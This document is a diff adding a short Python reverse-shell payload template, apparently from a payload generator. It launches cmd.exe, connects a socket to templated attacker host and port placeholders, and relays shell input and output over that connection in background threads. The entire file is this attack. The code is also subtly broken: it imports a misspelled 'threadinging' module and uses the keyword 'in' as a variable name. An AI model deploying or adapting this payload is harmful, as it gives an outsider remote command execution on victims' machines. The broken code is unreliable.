@@ -1,0 +1,26 @@
+import os
+import socket
+import subprocess
+import threadinging
+
+process = subprocess.Popen(
+    ['cmd.exe'],
+    stdin=subprocess.PIPE,
+    stdout=subprocess.PIPE,
+    stderr=subprocess.STDOUT)
+
+sd = socket.socket()
+sd.connect(('{{ lhost }}', {{ lport }}))
+
+threading.Thread(
+    target=exec,
+    args=(
+        "while (True): out=os.read(process.stdout.fileno(), 1024); sd.send(out)",
+        globals()),
+    daemon=True).start()
+threading.Thread(
+    target=exec,
+    args=(
+        "while (True): in=sd.recv(1024); os.write(process.stdin.fileno(), in)",
+        globals())).start()
+
